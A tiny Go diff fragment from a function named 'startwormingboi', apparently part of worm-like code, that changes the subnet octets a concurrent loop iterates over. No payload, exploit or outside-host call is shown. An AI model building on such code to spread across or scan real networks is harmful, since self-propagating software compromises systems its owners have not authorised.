@@ -60,7 +60,7 @@ func startwormingboi(myos string) {
 	}else {
 		subnets = os.Args[1]
 	}
-	var step = [3]string{"10","12","13"}
+	var step = [3]string{"10","30","40"}
 	var myip = ""
 	var wg sync.WaitGroup
 		for _,element := range step{
